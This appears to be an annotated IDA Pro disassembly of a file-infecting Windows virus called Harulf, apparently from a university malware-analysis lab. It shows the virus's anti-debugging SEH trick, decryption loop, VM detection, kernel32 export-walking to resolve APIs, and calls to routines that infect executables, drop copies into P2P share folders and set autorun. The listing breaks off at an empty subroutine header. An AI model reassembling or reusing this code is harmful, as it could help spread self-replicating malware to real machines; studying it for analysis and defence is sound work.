.text:00401000 ;
.text:00401000 ; +-------------------------------------------------------------------------+
.text:00401000 ; |      This file was generated by The Interactive Disassembler (IDA)      |
.text:00401000 ; |           Copyright (c) 2019 Hex-Rays, <support@hex-rays.com>           |
.text:00401000 ; |                      License info: 48-BABB-7E64-E2                      |
.text:00401000 ; |                     Georgia Institute of Technology                     |
.text:00401000 ; +-------------------------------------------------------------------------+
.text:00401000 ;
.text:00401000 ; Input SHA256 : 5F3C200DD06A1B610D7325B97E948564855CFB6B6C57270037EA65D1B6923C92
.text:00401000 ; Input MD5    : 491E53110DA0988C66D28B7860CEB330
.text:00401000 ; Input CRC32  : E04C1F0D
.text:00401000
.text:00401000 ; File Name   : /nethome/pthirumal3/ECE4117/lab7/harulf.exe
.text:00401000 ; Format      : Portable executable for 80386 (PE)
.text:00401000 ; Imagebase   : 400000
.text:00401000 ; Timestamp   : 4BC5AE6D (Wed Apr 14 12:00:45 2010)
.text:00401000 ; Section 1. (virtual address 00001000)
.text:00401000 ; Virtual size                  : 00001720 (   5920.)
.text:00401000 ; Section size in file          : 00001800 (   6144.)
.text:00401000 ; Offset to raw data for section: 00000200
.text:00401000 ; Flags E0000020: Text Executable Readable Writable
.text:00401000 ; Alignment     : default
.text:00401000
.text:00401000                 .686p
.text:00401000                 .mmx
.text:00401000                 .model flat
.text:00401000
.text:00401000 ; ===========================================================================
.text:00401000
.text:00401000 ; Segment type: Pure code
.text:00401000 ; Segment permissions: Read/Write/Execute
.text:00401000 _text           segment para public 'CODE' use32
.text:00401000                 assume cs:_text
.text:00401000                 ;org 401000h
.text:00401000                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text:00401000
.text:00401000 ; =============== S U B R O U T I N E =======================================
.text:00401000
.text:00401000
.text:00401000                 public start
.text:00401000 start           proc near               ; DATA XREF: exe_file+FB\u2193o
.text:00401000                                         ; exe_file:loc_401DFB\u2193r
.text:00401000
.text:00401000 arg_8           = dword ptr  0Ch
.text:00401000
.text:00401000 ; FUNCTION CHUNK AT .text:00401028 SIZE 0000004F BYTES
.text:00401000 ; FUNCTION CHUNK AT .text:00401277 SIZE 000000E9 BYTES
.text:00401000
.text:00401000                 jmp     short loc_40100A
.text:00401000 ; ---------------------------------------------------------------------------
.text:00401002 dword_401002    dd 0                    ; DATA XREF: start+2C0\u2193w
.text:00401002                                         ; start+34F\u2193r
.text:00401006 dword_401006    dd 0                    ; DATA XREF: start+2C6\u2193w
.text:00401006                                         ; start+355\u2193r
.text:0040100A ; ---------------------------------------------------------------------------
.text:0040100A
.text:0040100A loc_40100A:                             ; CODE XREF: start\u2191j
.text:0040100A                 call    stuck           ; call anti debugging routine
.text:0040100F                 jmp     short get_delta
.text:0040100F start           endp ; sp-analysis failed
.text:0040100F
.text:00401011
.text:00401011 ; =============== S U B R O U T I N E =======================================
.text:00401011
.text:00401011
.text:00401011 stuck           proc near               ; CODE XREF: start:loc_40100A\u2191p
.text:00401011                                         ; DATA XREF: start+3B\u2193o
.text:00401011                 mov     eax, [esp+0]    ; eax = address of jump get_delta instr
.text:00401014                 push    eax             ; push new SEH on stack
.text:00401015                 push    large dword ptr fs:0 ; push previous head of SEH chain
.text:0040101C                 mov     large fs:0, esp ; get_delta is now head of SEH chain
.text:00401023                 xor     eax, eax        ; eax = 0
.text:00401025                 mov     eax, [eax]      ; NULL pointer violation to call get_delta
.text:00401027                 retn
.text:00401027 stuck           endp ; sp-analysis failed
.text:00401027
.text:00401028 ; ---------------------------------------------------------------------------
.text:00401028 ; START OF FUNCTION CHUNK FOR start
.text:00401028
.text:00401028 get_delta:                              ; CODE XREF: start+F\u2191j
.text:00401028                 mov     eax, [esp+arg_8] ; stack fixup
.text:0040102C                 mov     esp, [eax+0C4h] ; stack fixup
.text:00401032                 pop     large dword ptr fs:0 ; restore SEH
.text:00401039                 pop     edx             ; edx = previous head of SEH chain
.text:0040103A                 pop     ebp             ; ebp = addr of jump get_delta
.text:0040103B                 sub     ebp, offset stuck ; sub the compile time offset of stuck
.text:00401041                 add     ebp, 2          ; new SEH with 2 bytes (jump get_delta)
.text:00401044                 cmp     ebp, 0          ; check which harulf generation it s and if we are at the entry point
.text:00401047                 jz      short loc_401072 ; if zero no need to decrypt
.text:00401049                 mov     esi, offset loc_401072 ; not zero means not at entry point so go and decrypt
.text:0040104E                 add     esi, ebp        ; esi + ebp
.text:00401050                 mov     ecx, 1720h      ; ecx = virus size
.text:00401055                 sub     ecx, 72h ; 'r'  ; ecx = virus size - stub size
.text:0040105B
.text:0040105B decrypt:                                ; CODE XREF: start+70\u2193j
.text:0040105B                 push    ecx             ; push ecx onto stack (decrypter file)
.text:0040105C                 mov     cx, [esi]       ; cx = addr of esi
.text:0040105F                 ror     ch, cl          ; right rotate ch by cl (decryption algo)
.text:00401061                 xchg    ch, cl          ; swap ch and cl
.text:00401063                 mov     [esi], cx       ; [esi] =  cx
.text:00401066                 add     esi, 2          ; esi += 2
.text:00401069                 pop     ecx             ; restore ecx
.text:0040106A                 sub     ecx, 2          ; ecx -= 2
.text:0040106D                 cmp     ecx, 0          ; check if you have finished decrypting. (Bug: The zero flag cannot be set if the virus length is not even)
.text:00401070                 ja      short decrypt   ; keep decrypting until all of virus is decrypted
.text:00401072
.text:00401072 loc_401072:                             ; CODE XREF: start+47\u2191j
.text:00401072                                         ; DATA XREF: start+49\u2191o
.text:00401072                 jmp     loc_401277      ; end of decryption
.text:00401072 ; END OF FUNCTION CHUNK FOR start
.text:00401072 ; ---------------------------------------------------------------------------
.text:00401077 byte_401077     db 0                    ; DATA XREF: start+2D4\u2193o
.text:00401077                                         ; sub_401B3B+1B\u2193o ...
.text:00401078                 dd 7Fh dup(0)
.text:00401274                 db 3 dup(0)
.text:00401277 ; ---------------------------------------------------------------------------
.text:00401277 ; START OF FUNCTION CHUNK FOR start
.text:00401277
.text:00401277 loc_401277:                             ; CODE XREF: start:loc_401072\u2191j
.text:00401277                 xor     ebx, ebx        ; ebx = 0
.text:00401279                 mov     ebx, esp        ; ebx = stack pointer
.text:0040127B                 sldt    word ptr [ebx+8] ; store segment selector from the local descriptor table register onto stack
.text:0040127F                 xor     eax, eax        ; eax = 0
.text:00401281                 mov     eax, [ebx+8]    ; eax = segment selector from the local descriptor table register
.text:00401284                 or      eax, eax        ; is LDT 0?
.text:00401286                 jnz     short 401289h   ; non-zero LDT base means there is a VMware
.text:00401288                 retn
.text:00401289 ; ---------------------------------------------------------------------------
.text:00401289                 xor     eax, eax        ; CODE XREF: start+286\u2191j
.text:00401289                                         ; eax = 0
.text:0040128B                 cpuid                   ; get vendor ID
.text:0040128D                 push    eax             ; save Maximum Input Value for Basic CPUID Information
.text:0040128E                 xor     eax, eax        ; eax = 0
.text:00401290                 inc     eax             ; eax = 1
.text:00401291                 cpuid                   ; get Version Information: Type, Family, Model, and Stepping ID
.text:00401293                 pop     ebx             ; ebx has the version info
.text:00401294                 xor     eax, ebx        ; check if the hypervisior bit is set
.text:00401296                 or      eax, eax        ; is it a vm?
.text:00401298                 jnz     short loc_40129B ; no so jump here
.text:0040129A                 retn                    ; return
.text:0040129B ; ---------------------------------------------------------------------------
.text:0040129B
.text:0040129B loc_40129B:                             ; CODE XREF: start+298\u2191j
.text:0040129B                 call    get_kernel
.text:004012A0                 call    find_main_api
.text:004012A5                 call    find_other_api
.text:004012AA                 call    polyizer
.text:004012AF ; ---------------------------------------------------------------------------
.text:004012AF                 call    getting_messagebox
.text:004012B4                 mov     ebx, ss:dword_401A22[ebp] ; ebx = old eip offset
.text:004012BA                 mov     edx, ss:dword_401A1E[ebp] ; edx = image base
.text:004012C0                 mov     ss:dword_401002[ebp], ebx ; save old eip into mem
.text:004012C6                 mov     ss:dword_401006[ebp], edx ; save image base into mem
.text:004012CC                 or      ebp, ebp        ; end of call stack?
.text:004012CE                 jz      short loc_4012E3 ; yes so jump here
.text:004012D0                 add     edx, ebx        ; no so add old eip + image base
.text:004012D2                 mov     edi, edx        ; edi = (old eip + image base)
.text:004012D4                 lea     esi, byte_401077[ebp] ; esi = dump bytes offset
.text:004012DA                 mov     ecx, 200h       ; 512 bytes to be copied
.text:004012DF                 rep movsb               ; copy
.text:004012E1                 jmp     short next_gen  ; jump here
.text:004012E3 ; ---------------------------------------------------------------------------
.text:004012E3
.text:004012E3 loc_4012E3:                             ; CODE XREF: start+2CE\u2191j
.text:004012E3                 call    loc_4012F3
.text:004012E3 ; ---------------------------------------------------------------------------
.text:004012E8                 db  73h ; s
.text:004012E9                 db  61h ; a
.text:004012EA                 db  6Dh ; m
.text:004012EB                 db  70h ; p
.text:004012EC                 db  6Ch ; l
.text:004012ED                 db  65h ; e
.text:004012EE                 db  2Eh ; .
.text:004012EF                 db  65h ; e
.text:004012F0                 db  78h ; x
.text:004012F1                 db  65h ; e
.text:004012F2                 db    0
.text:004012F3 ; ---------------------------------------------------------------------------
.text:004012F3
.text:004012F3 loc_4012F3:                             ; CODE XREF: start:loc_4012E3\u2191p
.text:004012F3                 pop     eax             ; restore eax
.text:004012F4                 call    exe_file        ; first .exe infection only for sample.exe
.text:004012F9                 retn
.text:004012FA ; ---------------------------------------------------------------------------
.text:004012FA
.text:004012FA next_gen:                               ; CODE XREF: start+2E1\u2191j
.text:004012FA                 mov     ecx, 0FFh       ; ecx = 0FFh
.text:004012FF                 call    random_number   ; get a random number
.text:00401304                 mov     dword ptr ss:byte_4018C2[ebp], eax ; save random number into mem
.text:0040130A                 call    infect_exe
.text:0040130F                 call    get_name
.text:00401314                 or      eax, eax        ; valid name?
.text:00401316                 jz      short loc_401332 ; yes so jump here
.text:00401318                 call    run_explorer    ; no so run explorer.exe
.text:0040131D                 call    saddam_family
.text:00401322                 call    p2p_share_folders ; ;drop in p2p default (harcoded) share folders
.text:00401327                 call    p2p_share_folders
.text:0040132C                 call    autorun_harulf
.text:00401331                 retn
.text:00401332 ; ---------------------------------------------------------------------------
.text:00401332
.text:00401332 loc_401332:                             ; CODE XREF: start+316\u2191j
.text:00401332                 call    is_user_admin
.text:00401337                 call    saddam_family
.text:0040133C                 call    p2p_share_folders
.text:00401341                 call    p2p_share_folders
.text:00401346                 call    autorun_harulf
.text:0040134B                 or      ebp, ebp        ; end of call stack?
.text:0040134D                 jz      short locret_40135F ; yes so return
.text:0040134F                 mov     eax, ss:dword_401002[ebp] ; no so restore eip
.text:00401355                 mov     ebx, ss:dword_401006[ebp] ; restore image base
.text:0040135B                 add     eax, ebx        ; eip + image base
.text:0040135D                 jmp     eax             ; go to original instr
.text:0040135F ; ---------------------------------------------------------------------------
.text:0040135F
.text:0040135F locret_40135F:                          ; CODE XREF: start+34D\u2191j
.text:0040135F                 retn                    ; return
.text:0040135F ; END OF FUNCTION CHUNK FOR start
.text:00401360
.text:00401360 ; =============== S U B R O U T I N E =======================================
.text:00401360
.text:00401360
.text:00401360 getting_messagebox proc near            ; CODE XREF: start+2AF\u2191p
.text:00401360                 lea     eax, aUser32Dll[ebp] ; "user32.dll"
.text:00401366                 push    eax             ; push user32.dll onto stack
.text:00401367                 call    ss:dword_40177B[ebp] ; call LoadLibrary func
.text:0040136D                 mov     ss:dword_4013DC[ebp], eax ; save handle to mem
.text:00401373                 lea     eax, unk_4013C1[ebp] ; eax = MessageBoxA
.text:00401379                 push    eax             ; push "MessageBoxA" onto stack
.text:0040137A                 push    ss:dword_4013DC[ebp] ; push user32.dll module handle onto stack
.text:00401380                 call    ss:dword_401449[ebp] ; call GetProcAddress func
.text:00401386                 mov     ss:dword_4013CD[ebp], eax ; save addr into mem
.text:0040138C                 retn                    ; return
.text:0040138C getting_messagebox endp ; sp-analysis failed
.text:0040138C
.text:0040138D ; ---------------------------------------------------------------------------
.text:0040138D ; START OF FUNCTION CHUNK FOR find_main_api
.text:0040138D ;   ADDITIONAL PARENT FUNCTION sub_401813
.text:0040138D ;   ADDITIONAL PARENT FUNCTION sub_40188E
.text:0040138D ;   ADDITIONAL PARENT FUNCTION exe_file
.text:0040138D
.text:0040138D loc_40138D:                             ; CODE XREF: find_main_api+5C\u2193j
.text:0040138D                                         ; find_main_api+FF\u2193j ...
.text:0040138D                 push    0               ; exit code 0 (ERROR_SUCCESS)
.text:0040138F                 call    dword_401777    ; call ExitProcess
.text:0040138F ; ---------------------------------------------------------------------------
.text:00401395                 db  77h ; w
.text:00401396                 db  33h ; 3
.text:00401397                 db  32h ; 2
.text:00401398                 db  2Fh ; /
.text:00401399                 db  48h ; H
.text:0040139A                 db  61h ; a
.text:0040139B                 db  72h ; r
.text:0040139C                 db  75h ; u
.text:0040139D                 db  6Ch ; l
.text:0040139E                 db  66h ; f
.text:0040139F                 db  20h
.text:004013A0                 db  63h ; c
.text:004013A1                 db  6Fh ; o
.text:004013A2                 db  64h ; d
.text:004013A3                 db  65h ; e
.text:004013A4                 db  64h ; d
.text:004013A5                 db  20h
.text:004013A6                 db  62h ; b
.text:004013A7                 db  79h ; y
.text:004013A8                 db  20h
.text:004013A9                 db  66h ; f
.text:004013AA                 db  61h ; a
.text:004013AB                 db  6Bh ; k
.text:004013AC                 db  65h ; e
.text:004013AD                 db  64h ; d
.text:004013AE                 db  6Dh ; m
.text:004013AF                 db  6Eh ; n
.text:004013B0                 db  64h ; d
.text:004013B1                 db  65h ; e
.text:004013B2                 db  64h ; d
.text:004013B3                 db  21h ; !
.text:004013B4                 db    0
.text:004013B5                 db  45h ; E
.text:004013B6                 db  30h ; 0
.text:004013B7                 db  46h ; F
.text:004013B8                 db  2Dh ; -
.text:004013B9                 db  50h ; P
.text:004013BA                 db  52h ; R
.text:004013BB                 db  6Fh ; o
.text:004013BC                 db  6Ah ; j
.text:004013BD                 db  65h ; e
.text:004013BE                 db  6Bh ; k
.text:004013BF                 db  74h ; t
.text:004013C0                 db    0
.text:004013C1 unk_4013C1      db  4Dh ; M             ; DATA XREF: getting_messagebox+13\u2191o
.text:004013C2                 db  65h ; e
.text:004013C3                 db  73h ; s
.text:004013C4                 db  73h ; s
.text:004013C5                 db  61h ; a
.text:004013C6                 db  67h ; g
.text:004013C7                 db  65h ; e
.text:004013C8                 db  42h ; B
.text:004013C9                 db  6Fh ; o
.text:004013CA                 db  78h ; x
.text:004013CB                 db  41h ; A
.text:004013CB ; END OF FUNCTION CHUNK FOR find_main_api
.text:004013CC                 db 0
.text:004013CD dword_4013CD    dd 0                    ; DATA XREF: getting_messagebox+26\u2191w
.text:004013CD                                         ; is_user_admin+1C\u2193r
.text:004013D1 aUser32Dll      db 'user32.dll',0       ; DATA XREF: getting_messagebox\u2191o
.text:004013DC dword_4013DC    dd 0                    ; DATA XREF: getting_messagebox+D\u2191w
.text:004013DC                                         ; getting_messagebox+1A\u2191r
.text:004013E0                 dd 2 dup(0)
.text:004013E8
.text:004013E8 ; =============== S U B R O U T I N E =======================================
.text:004013E8
.text:004013E8
.text:004013E8 get_kernel      proc near               ; CODE XREF: start:loc_40129B\u2191p
.text:004013E8
.text:004013E8 arg_0           = dword ptr  4
.text:004013E8
.text:004013E8                 jmp     short loc_4013EE ; jump here
.text:004013E8 ; ---------------------------------------------------------------------------
.text:004013EA dword_4013EA    dd 0                    ; DATA XREF: get_kernel+25\u2193w
.text:004013EA                                         ; find_main_api:loc_401462\u2193r ...
.text:004013EE ; ---------------------------------------------------------------------------
.text:004013EE
.text:004013EE loc_4013EE:                             ; CODE XREF: get_kernel\u2191j
.text:004013EE                 mov     ecx, [esp+arg_0] ; addr of prev call (ecx = [esp + 4])
.text:004013F2
.text:004013F2 loop_find_kernel:                       ; CODE XREF: get_kernel+16\u2193j
.text:004013F2                                         ; get_kernel+1C\u2193j ...
.text:004013F2                 xor     edx, edx        ; edx = 0
.text:004013F4                 dec     ecx             ; scan backward
.text:004013F5                 mov     dx, [ecx+3Ch]   ; Take beginning of PE header
.text:004013F9                 test    dx, 0F800h      ; is it a PE header?
.text:004013FE                 jnz     short loop_find_kernel ; no so loop through again
.text:00401400                 cmp     ecx, [edx+ecx+34h] ; compare current addr with the addr that PE should be loaded at
.text:00401404                 jnz     short loop_find_kernel ; different so search again
.text:00401406                 cmp     word ptr [ecx], 5A4Dh ; is it = MZ? (check if format is executable)
.text:0040140B                 jnz     short loop_find_kernel ; different so search again
.text:0040140D                 mov     ss:dword_4013EA[ebp], ecx ; ecx hold KernelBase store it
.text:00401413                 retn                    ; return
.text:00401413 get_kernel      endp
.text:00401413
.text:00401414
.text:00401414 ; =============== S U B R O U T I N E =======================================
.text:00401414
.text:00401414
.text:00401414 find_main_api   proc near               ; CODE XREF: start+2A0\u2191p
.text:00401414
.text:00401414 ; FUNCTION CHUNK AT .text:0040138D SIZE 0000003F BYTES
.text:00401414
.text:00401414                 jmp     short loc_401462 ; jump here
.text:00401414 ; ---------------------------------------------------------------------------
.text:00401416 dword_401416    dd 0                    ; DATA XREF: find_main_api+62\u2193w
.text:0040141A dword_40141A    dd 0                    ; DATA XREF: find_main_api+76\u2193w
.text:0040141E dword_40141E    dd 0                    ; DATA XREF: find_main_api+6F\u2193w
.text:00401422                 align 4
.text:00401424                 db 2 dup(0)
.text:00401426 dword_401426    dd 0                    ; DATA XREF: find_main_api+94\u2193w
.text:0040142A dword_40142A    dd 0                    ; DATA XREF: find_main_api+A3\u2193w
.text:0040142A                                         ; find_main_api+11E\u2193r
.text:0040142E dword_40142E    dd 0                    ; DATA XREF: find_main_api+C1\u2193w
.text:0040142E                                         ; find_main_api+10E\u2193r
.text:00401432 dword_401432    dd 0                    ; DATA XREF: find_main_api+B2\u2193w
.text:00401432                                         ; find_main_api+CB\u2193r
.text:00401436 dword_401436    dd 0                    ; DATA XREF: find_main_api+8B\u2193w
.text:0040143A aGetprocaddress db 'GetProcAddress',0   ; DATA XREF: find_main_api+D1\u2193o
.text:00401449 dword_401449    dd 0                    ; DATA XREF: getting_messagebox+20\u2191r
.text:00401449                                         ; find_main_api+12E\u2193w ...
.text:0040144D aGetmodulehandl db 'GetModuleHandleA',0
.text:0040145E                 align 10h
.text:00401460                 db 2 dup(0)
.text:00401462 ; ---------------------------------------------------------------------------
.text:00401462
.text:00401462 loc_401462:                             ; CODE XREF: find_main_api\u2191j
.text:00401462                 mov     edi, ss:dword_4013EA[ebp] ; edi = offset addr of kernel base
.text:00401468                 add     edi, [edi+3Ch]  ; RVA of PE signature
.text:0040146B                 cmp     word ptr [edi], 4550h ; check if format is portable executable
.text:00401470                 jnz     loc_40138D      ; not a PE so jump
.text:00401476                 mov     ss:dword_401416[ebp], edi ; store addr of pe format
.text:0040147C                 mov     eax, [edi+78h]  ; RVA of export table
.text:0040147F                 push    eax             ; push RVA of export table onto stack
.text:00401480                 mov     eax, [edi+7Ch]  ; export table size
.text:00401483                 mov     ss:dword_40141E[ebp], eax ; save export table size into memory
.text:00401489                 pop     eax             ; eax = RVA of export table
.text:0040148A                 mov     ss:dword_40141A[ebp], eax ; save RVA of export table into memory
.text:00401490                 add     eax, ss:dword_4013EA[ebp] ; RVA of export table + kernel base offset gives ordinal base
.text:00401496                 mov     edx, [eax+10h]  ; edx = ordinal base
.text:00401499                 add     edx, ss:dword_4013EA[ebp] ; ordinal base + kernel base offset ???
.text:0040149F                 mov     ss:dword_401436[ebp], edx ; save ordinal base + kernel 32 base offset into memory
.text:004014A5                 mov     edx, [eax+18h]  ; edx = number of names of exported functions
.text:004014A8                 mov     ss:dword_401426[ebp], edx ; save number of names into mem
.text:004014AE                 mov     edx, [eax+1Ch]  ; edx = Address of exported Functions
.text:004014B1                 add     edx, ss:dword_4013EA[ebp] ; addr of exported functions + kernel base offset
.text:004014B7                 mov     ss:dword_40142A[ebp], edx ; save to mem
.text:004014BD                 mov     edx, [eax+20h]  ; addr of exported function name
.text:004014C0                 add     edx, ss:dword_4013EA[ebp] ; addr of exported function names + kernel base offset
.text:004014C6                 mov     ss:dword_401432[ebp], edx ; save to mem
.text:004014CC                 mov     edx, [eax+24h]  ; edx = addr of NameOrdinals
.text:004014CF                 add     edx, ss:dword_4013EA[ebp] ; addr of NameOrdinals + kernel base offset
.text:004014D5                 mov     ss:dword_40142E[ebp], edx ; save to mem
.text:004014DB                 xor     edx, edx        ; edx = 0
.text:004014DD                 xor     eax, eax        ; edx = 0
.text:004014DF                 mov     eax, ss:dword_401432[ebp] ; eax = RVA of exported funtion names
.text:004014E5                 mov     edx, offset aGetprocaddress ; "GetProcAddress"
.text:004014EA                 add     edx, ebp        ; starting of dword array of function names in kernel32
.text:004014EC                 xor     ecx, ecx        ; ecx = 0
.text:004014EE                 mov     edi, [eax]      ; edi = RVA of exported function names
.text:004014F0                 add     edi, ss:dword_4013EA[ebp] ; edi = kernel base offset
.text:004014F6
.text:004014F6 loc_4014F6:                             ; CODE XREF: find_main_api+FD\u2193j
.text:004014F6                 mov     esi, edx        ; starting of dword array of function names in kernel32
.text:004014F8
.text:004014F8 compare_bytes:                          ; CODE XREF: find_main_api+EC\u2193j
.text:004014F8                 cmpsb                   ; check if byte matches getProcAddress
.text:004014F9                 jnz     short increment_index ; no so jump here
.text:004014FB                 cmp     byte ptr [edi], 0 ; eof addr?
.text:004014FE                 jz      short found     ; byte matches so jump here
.text:00401500                 jmp     short compare_bytes ; check byte by byte
.text:00401502 ; ---------------------------------------------------------------------------
.text:00401502
.text:00401502 increment_index:                        ; CODE XREF: find_main_api+E5\u2191j
.text:00401502                 add     cx, 1           ; check next byte
.text:00401506                 add     eax, 4          ; increment array index
.text:00401509                 mov     edi, [eax]      ; save addr of getProcAddr name
.text:0040150B                 add     edi, ss:dword_4013EA[ebp] ; offset it ??
.text:00401511                 jmp     short loc_4014F6 ; loop through until we find
.text:00401513 ; ---------------------------------------------------------------------------
.text:00401513                 jmp     loc_40138D
.text:00401518 ; ---------------------------------------------------------------------------
.text:00401518
.text:00401518 found:                                  ; CODE XREF: find_main_api+EA\u2191j
.text:00401518                 mov     edi, [eax]      ; edi = addr of getProcAddr
.text:0040151A                 add     edi, ss:dword_4013EA[ebp] ; add kernel base offset
.text:00401520                 shl     ecx, 1          ; make it 2 byte addressable
.text:00401522                 mov     eax, ss:dword_40142E[ebp] ; eax = Name ordinals
.text:00401528                 add     eax, ecx        ; name ordinals + kernel base offset
.text:0040152A                 xor     ecx, ecx        ; ecx = 0
.text:0040152C                 mov     cx, [eax]       ; cx = pointed to ordinal
.text:0040152F                 shl     ecx, 2          ; make it 4 byte addressable
.text:00401532                 mov     eax, ss:dword_40142A[ebp] ; eax = RVA of functions
.text:00401538                 add     eax, ecx        ; use ordinal to find RVA of getProcArocAddr
.text:0040153A                 mov     eax, [eax]      ; pointer to RVA of getProcAddr
.text:0040153C                 add     eax, ss:dword_4013EA[ebp] ; add kernel base offset
.text:00401542                 mov     ss:dword_401449[ebp], eax ; store physical addr getProcAddr
.text:00401548                 retn                    ; return
.text:00401548 find_main_api   endp ; sp-analysis failed
.text:00401548
.text:00401549 ; ---------------------------------------------------------------------------
.text:00401549                 mov     eax, 0          ; eax = 0
.text:0040154E                 retn                    ; return
.text:0040154F
.text:0040154F ; =============== S U B R O U T I N E =======================================
.text:0040154F
.text:0040154F ; Attributes: thunk
.text:0040154F
.text:0040154F find_other_api  proc near               ; CODE XREF: start+2A5\u2191p
.text:0040154F                 jmp     sub_401813      ; jump here
.text:0040154F find_other_api  endp
.text:0040154F
.text:0040154F ; ---------------------------------------------------------------------------
.text:00401554 dword_401554    dd 0                    ; DATA XREF: sub_401813+14\u2193w
.text:00401554                                         ; sub_401813+35\u2193w ...
.text:00401558 aAdvapi32Dll    db 'advapi32.dll',0     ; DATA XREF: sub_401813+1F\u2193o
.text:00401565                 align 4
.text:00401568                 db 0
.text:00401569 aShell32Dll     db 'shell32.dll',0      ; DATA XREF: sub_401813+4E\u2193o
.text:00401575                 align 4
.text:00401578                 db 0
.text:00401579 aGetlogicaldriv db 'GetLogicalDrives',0 ; DATA XREF: sub_401813\u2193o
.text:0040158A aCreatefilea    db 'CreateFileA',0
.text:00401596 aClosehandle    db 'CloseHandle',0
.text:004015A2 aWritefile      db 'WriteFile',0
.text:004015AC aReadfile       db 'ReadFile',0
.text:004015B5 aBeginupdateres db 'BeginUpdateResourceA',0
.text:004015CA aUpdateresource db 'UpdateResourceA',0
.text:004015DA aEndupdateresou db 'EndUpdateResourceA',0
.text:004015ED aFindresourcea  db 'FindResourceA',0
.text:004015FB aGetfilesize    db 'GetFileSize',0
.text:00401607 aGlobalalloc    db 'GlobalAlloc',0
.text:00401613 aSetfilepointer db 'SetFilePointer',0
.text:00401622 aGetversionexa  db 'GetVersionExA',0
.text:00401630 aGetdateformata db 'GetDateFormatA',0
.text:0040163F aSleep          db 'Sleep',0
.text:00401645 aFindfirstfilea db 'FindFirstFileA',0
.text:00401654 aFindnextfilea  db 'FindNextFileA',0
.text:00401662 aFindclose      db 'FindClose',0
.text:0040166C aGetlasterror   db 'GetLastError',0
.text:00401679 aExitprocess    db 'ExitProcess',0
.text:00401685 aLoadlibrarya   db 'LoadLibraryA',0
.text:00401692 aFreelibrary    db 'FreeLibrary',0
.text:0040169E aExpandenvironm db 'ExpandEnvironmentStringsA',0
.text:004016B8 aGetmodulefilen db 'GetModuleFileNameA',0
.text:004016CB aCopyfilea      db 'CopyFileA',0
.text:004016D5 aGetcurrentdire db 'GetCurrentDirectoryA',0
.text:004016EA aSetcurrentdire db 'SetCurrentDirectoryA',0
.text:004016FF aGetfileattribu db 'GetFileAttributesA',0
.text:00401712 aGettickcount   db 'GetTickCount',0
.text:0040171F aWinexec        db 'WinExec',0
.text:00401727                 db 0FFh
.text:00401728                 db 3 dup(0)
.text:0040172B dword_40172B    dd 0                    ; DATA XREF: sub_401813+5\u2193o
.text:0040172B                                         ; autorun_harulf\u2193r
.text:0040172F dword_40172F    dd 0                    ; DATA XREF: exe_file+19C\u2193r
.text:0040172F                                         ; sub_40230C+5F\u2193r
.text:00401733 dword_401733    dd 0                    ; DATA XREF: sub_40230C+7E\u2193r
.text:00401737 dword_401737    dd 0                    ; DATA XREF: exe_file+2CF\u2193r
.text:00401737                                         ; sub_40230C+77\u2193r
.text:0040173B dword_40173B    dd 0                    ; DATA XREF: exe_file+1FA\u2193r
.text:0040173F dword_40173F    dd 0                    ; DATA XREF: exe_file+144\u2193r
.text:00401743 dword_401743    dd 0                    ; DATA XREF: exe_file+168\u2193r
.text:00401747 dword_401747    dd 0                    ; DATA XREF: exe_file+17A\u2193r
.text:0040174B dword_40174B    dd 0                    ; DATA XREF: exe_file+2D\u2193r
.text:0040174F dword_40174F    dd 0                    ; DATA XREF: exe_file+1B3\u2193r
.text:00401753 dword_401753    dd 0                    ; DATA XREF: infect_exe+8\u2193r
.text:00401753                                         ; exe_file+E7\u2193r ...
.text:00401757 dword_401757    dd 0                    ; DATA XREF: exe_file+2AD\u2193r
.text:0040175B                 align 4
.text:0040175C                 db 3 dup(0)
.text:0040175F dword_40175F    dd 0                    ; DATA XREF: saddam_family+15\u2193r
.text:00401763 dword_401763    dd 0                    ; DATA XREF: saddam_family+61\u2193r
.text:00401767 dword_401767    dd 0                    ; DATA XREF: infect_exe+2A\u2193r
.text:0040176B dword_40176B    dd 0                    ; DATA XREF: infect_exe+73\u2193r
.text:0040176F dword_40176F    dd 0                    ; DATA XREF: infect_exe+B4\u2193r
.text:00401773 dword_401773    dd 0                    ; DATA XREF: infect_exe+79\u2193r
.text:00401777 dword_401777    dd 0                    ; DATA XREF: find_main_api-85\u2191r
.text:0040177B dword_40177B    dd 0                    ; DATA XREF: getting_messagebox+7\u2191r
.text:0040177B                                         ; sub_401813+27\u2193r ...
.text:0040177F dword_40177F    dd 0                    ; DATA XREF: exe_file+DA\u2193r
.text:00401783                 align 4
.text:00401784                 db 3 dup(0)
.text:00401787 dword_401787    dd 0                    ; DATA XREF: get_name+20\u2193r
.text:0040178B dword_40178B    dd 0                    ; DATA XREF: p2p_share_folders+14\u2193r
.text:0040178B                                         ; sub_40230C+45\u2193r
.text:0040178F dword_40178F    dd 0                    ; DATA XREF: sub_40230C+1E\u2193r
.text:00401793 dword_401793    dd 0                    ; DATA XREF: sub_40230C+2B\u2193r
.text:00401793                                         ; sub_40230C+8A\u2193r
.text:00401797                 align 4
.text:00401798                 db 3 dup(0)
.text:0040179B dword_40179B    dd 0                    ; DATA XREF: random_number+2\u2193r
.text:0040179F dword_40179F    dd 0                    ; DATA XREF: saddam_family+70\u2193r
.text:0040179F                                         ; run_explorer+3F\u2193r
.text:004017A3                 db 0FFh
.text:004017A4                 db 3 dup(0)
.text:004017A7 aRegopenkeyexa  db 'RegOpenKeyExA',0    ; DATA XREF: sub_401813+3B\u2193o
.text:004017B5 aRegqueryvaluee db 'RegQueryValueExA',0
.text:004017C6 aRegsetvalueexa db 'RegSetValueExA',0
.text:004017D5 aRegclosekey    db 'RegCloseKey',0
.text:004017E1                 db 0FFh, 2 dup(0)
.text:004017E4                 db 0
.text:004017E5 dword_4017E5    dd 0                    ; DATA XREF: sub_401813+40\u2193o
.text:004017E5                                         ; sub_401F45+17\u2193r
.text:004017E9                 align 4
.text:004017EC                 db 0
.text:004017ED dword_4017ED    dd 0                    ; DATA XREF: sub_401F45+44\u2193r
.text:004017F1 dword_4017F1    dd 0                    ; DATA XREF: sub_401F45+50\u2193r
.text:004017F5                 db 0FFh, 2 dup(0)
.text:004017F8                 db 0
.text:004017F9 aIsuseranadmin  db 'IsUserAnAdmin',0    ; DATA XREF: sub_401813+69\u2193o
.text:00401807                 db 0FFh
.text:00401808                 db 3 dup(0)
.text:0040180B dword_40180B    dd 0                    ; DATA XREF: sub_401813+6F\u2193o
.text:0040180B                                         ; is_user_admin\u2193r
.text:0040180F                 db 0FFh
.text:00401810                 db 3 dup(0)
.text:00401813
.text:00401813 ; =============== S U B R O U T I N E =======================================
.text:00401813
.text:00401813
